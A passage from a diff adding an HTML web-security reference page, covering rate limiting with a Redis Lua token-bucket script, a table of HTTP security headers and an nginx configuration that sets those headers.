+      <li>Store workflow state in the session, not in client-controlled fields</li>
+      <li>Rate-limit and serialise sensitive operations (use database-level locking for financial transactions)</li>
+      <li>Write explicit business-logic test cases, not just security checks</li>
+      <li>Conduct threat modelling with product and engineering teams to enumerate assumptions</li>
+    </ul>
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/" target="_blank">OWASP WSTG Business Logic</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://portswigger.net/web-security/logic-flaws" target="_blank" class="community">PortSwigger Logic Flaws</a>
+      <a href="https://portswigger.net/web-security/race-conditions" target="_blank" class="community">PortSwigger Race Conditions</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="rate-limiting">Rate Limiting &amp; Throttling</h2>
+
+  <p>Without rate limiting, attackers can perform credential stuffing, brute-force, enumeration, scraping, and application-layer DoS at high speed. Rate limiting is a defence-in-depth control that reduces the viability of automated attacks by adding a cost (time) to each attempt.</p>
+
+  <p>Rate limiting must be applied at the right granularity: too broad and legitimate users are blocked; too narrow and it provides no protection. A common pattern is tiered limits — per-IP for unauthenticated endpoints, per-user for authenticated ones, and per-endpoint for expensive operations.</p>
+
+  <h4>Token Bucket Algorithm</h4>
+  <pre>Each user has a "bucket" with capacity N tokens.
+Tokens refill at rate R per second.
+Each request costs 1 token.
+When bucket is empty: 429 Too Many Requests.
+
+Example: 60 requests/minute, burst up to 10
+→ refill rate: 1/second, capacity: 10
+
+Implementation (Redis + Lua — atomic):
+local key = KEYS[1]
+local capacity = tonumber(ARGV[1])
+local refill_rate = tonumber(ARGV[2])  -- per second
+local now = tonumber(ARGV[3])
+
+local bucket = redis.call('HMGET', key, 'tokens', 'last_refill')
+local tokens = tonumber(bucket[1]) or capacity
+local last = tonumber(bucket[2]) or now
+
+-- Refill
+local elapsed = now - last
+tokens = math.min(capacity, tokens + elapsed * refill_rate)
+
+if tokens >= 1 then
+  tokens = tokens - 1
+  redis.call('HMSET', key, 'tokens', tokens, 'last_refill', now)
+  redis.call('EXPIRE', key, 3600)
+  return 1  -- allowed
+else
+  return 0  -- rate limited
+end</pre>
+
+  <table>
+    <thead>
+      <tr><th>Strategy</th><th>Key by</th><th>Use case</th></tr>
+    </thead>
+    <tbody>
+      <tr><td>Per-IP</td><td>Client IP</td><td>Unauthenticated endpoints, login</td></tr>
+      <tr><td>Per-user</td><td>Session/user ID</td><td>Authenticated API endpoints</td></tr>
+      <tr><td>Per-endpoint</td><td>IP + path</td><td>Expensive operations (password reset, upload)</td></tr>
+      <tr><td>Global</td><td>None</td><td>Overall system capacity</td></tr>
+    </tbody>
+  </table>
+
+  <div class="info-box note">
+    <strong>HTTP 429:</strong> Return a <code>Retry-After</code> header with 429 responses. Don't silently drop requests — inform the client. Consider distinguishing rate limiting (429) from account lockout (401/403 with message).
+  </div>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://owasp.org/www-community/controls/Blocking_Brute_Force_Attacks" target="_blank">OWASP Brute Force Blocking</a>
+      <a href="https://tools.ietf.org/html/rfc6585" target="_blank">RFC 6585 (429 status)</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://cloud.google.com/architecture/rate-limiting-strategies-techniques" target="_blank" class="community">Google Rate Limiting Strategies</a>
+      <a href="https://portswigger.net/web-security/authentication/password-based" target="_blank" class="community">PortSwigger Password-Based Auth</a>
+    </div>
+  </div>
+
+  <!-- ============================================================ -->
+  <h2 id="http-headers">HTTP Security Headers Reference</h2>
+
+  <p>HTTP response headers instruct the browser on security policies. A missing header is not a vulnerability on its own, but together they form a critical layer of defence-in-depth that can prevent XSS exploitation, clickjacking, MIME confusion attacks, and protocol downgrade attacks. They are low-cost to implement and have immediate browser-enforced effect.</p>
+
+  <table>
+    <thead>
+      <tr><th>Header</th><th>Value</th><th>What it does</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><code>Content-Security-Policy</code></td>
+        <td><code>default-src 'self'; script-src 'self' 'nonce-{random}'; object-src 'none'; base-uri 'self'</code></td>
+        <td>Controls which resources the browser may load. Blocks inline scripts (XSS mitigation). <strong>Note:</strong> clickjacking protection specifically requires the <code>frame-ancestors</code> directive (e.g., <code>frame-ancestors 'none'</code>) — it is <em>not</em> provided by <code>default-src</code> or other general directives. The example value shown here does not include <code>frame-ancestors</code>; add it explicitly if framing protection is needed.</td>
+      </tr>
+      <tr>
+        <td><code>X-Content-Type-Options</code></td>
+        <td><code>nosniff</code></td>
+        <td>Prevents MIME-type sniffing — browser respects declared Content-Type. Stops <code>.jpg</code> being executed as JS.</td>
+      </tr>
+      <tr>
+        <td><code>X-Frame-Options</code></td>
+        <td><code>DENY</code> or <code>SAMEORIGIN</code></td>
+        <td>Prevents page being embedded in an iframe (clickjacking). Superseded by CSP <code>frame-ancestors</code>.</td>
+      </tr>
+      <tr>
+        <td><code>Strict-Transport-Security</code></td>
+        <td><code>max-age=31536000; includeSubDomains; preload</code></td>
+        <td>Forces HTTPS for 1 year. Prevents SSL stripping attacks. Submit to HSTS preload list.</td>
+      </tr>
+      <tr>
+        <td><code>Referrer-Policy</code></td>
+        <td><code>strict-origin-when-cross-origin</code></td>
+        <td>Limits Referer header to origin only for cross-origin requests. Prevents leaking paths/query strings.</td>
+      </tr>
+      <tr>
+        <td><code>Permissions-Policy</code></td>
+        <td><code>camera=(), microphone=(), geolocation=()</code></td>
+        <td>Disables browser features not used by your app. Limits damage from XSS.</td>
+      </tr>
+      <tr>
+        <td><code>Cross-Origin-Opener-Policy</code></td>
+        <td><code>same-origin</code></td>
+        <td>Isolates browsing context — prevents cross-origin window.opener attacks. Required for SharedArrayBuffer.</td>
+      </tr>
+      <tr>
+        <td><code>Cross-Origin-Embedder-Policy</code></td>
+        <td><code>require-corp</code></td>
+        <td>Requires cross-origin resources to opt-in via CORP header. Required for SharedArrayBuffer.</td>
+      </tr>
+      <tr>
+        <td><code>Cross-Origin-Resource-Policy</code></td>
+        <td><code>same-origin</code> or <code>same-site</code></td>
+        <td>Prevents other origins from reading this resource (via <code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>fetch</code>).</td>
+      </tr>
+      <tr>
+        <td><code>Cache-Control</code></td>
+        <td><code>no-store</code> (for sensitive pages)</td>
+        <td>Prevents sensitive pages being cached by browser or CDN.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="info-box note">
+    <strong>Scan your headers:</strong> Use <a href="https://securityheaders.com" target="_blank">https://securityheaders.com</a> to scan your site and get a graded report of missing or misconfigured security headers.
+  </div>
+
+  <pre>// nginx — security headers
+add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';" always;
+add_header X-Content-Type-Options "nosniff" always;
+add_header X-Frame-Options "DENY" always;
+add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
+add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;
+add_header Cross-Origin-Opener-Policy "same-origin" always;
+add_header Cross-Origin-Embedder-Policy "require-corp" always;</pre>
+
+  <div class="refs">
+    <div class="refs-title">References</div>
+    <div class="refs-row">
+      <span class="refs-label">Official</span>
+      <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank">MDN CSP</a>
+      <a href="https://owasp.org/www-project-secure-headers/" target="_blank">OWASP Secure Headers</a>
+    </div>
+    <div class="refs-row">
+      <span class="refs-label">Community</span>
+      <a href="https://securityheaders.com" target="_blank" class="community">securityheaders.com</a>
+      <a href="https://csp-evaluator.withgoogle.com/" target="_blank" class="community">CSP Evaluator (Google)</a>
+    </div>
+  </div>
+
+</main>
+
+<script>
+  document.querySelectorAll('nav a').forEach(link => {
+    link.addEventListener('click', e => {
+      const href = link.getAttribute('href');
+      if (href && href.startsWith('#')) {
+        e.preventDefault();
+        const target = document.querySelector(href);
+        if (target) target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      }
+    });
+  });
+
+  const headings = document.querySelectorAll('h2[id], h1[id]');
+  const navLinks = document.querySelectorAll('nav a');
+
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting) {
+        navLinks.forEach(l => l.classList.remove('active'));
+        const active = document.querySelector(`nav a[href="#${entry.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-20% 0px -80% 0px' });
+
+  headings.forEach(s => observer.observe(s));
+</script>
+
+</body>
+</html>
